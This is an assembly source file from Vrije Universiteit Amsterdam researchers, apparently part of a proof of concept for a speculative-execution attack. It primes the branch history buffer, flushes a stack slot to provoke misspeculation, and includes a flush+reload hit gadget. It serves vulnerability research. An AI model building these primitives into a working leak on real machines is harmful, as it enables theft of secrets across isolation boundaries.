; Thursday, September 9th 2021
;
; Enrico Barberis - e.barberis@vu.nl
; Pietro Frigo - p.frigo@vu.nl
; Marius Muench - m.muench@vu.nl
; Herbert Bos - herbertb@cs.vu.nl
; Cristiano Giuffrida - giuffrida@cs.vu.nl
;
; Vrije Universiteit Amsterdam - Amsterdam, The Netherlands

;Must match with main.c MAX_HISTORY_SIZE !
%define MAX_HISTORY_SIZE 256

section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; ind_call_hit
; - rdi: ptr history
; - rsi: ind call destination
; - rdx: ind call argument 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
align 0x1000
global fill_bhb 
fill_bhb:

    ;Perform 128 jumps to fill the BHB with a controlled history
    %assign i 0
    %rep MAX_HISTORY_SIZE
    movzx   rax, byte [rdi]
    inc     rdi
    cmp     rax, 1
    je      ind_call_hit_%+i
    ind_call_hit_%+i:
    %assign i i+1
    %endrep

    ;setup arguments
    mov     rdi, rdx

    ;make speculation more likely
    push    rsi
    clflush [rsp]
    mfence

global victim_call
victim_call:
    ;perform indirect call
    call    [rsp]

    add     rsp, 8
    ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; ret_gadget
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global ret_gadget
ret_gadget:
    ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; hit_gadget
; - rdi: fr_buf
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global hit_gadget
hit_gadget:
    mov     rax, [rdi]
    ret

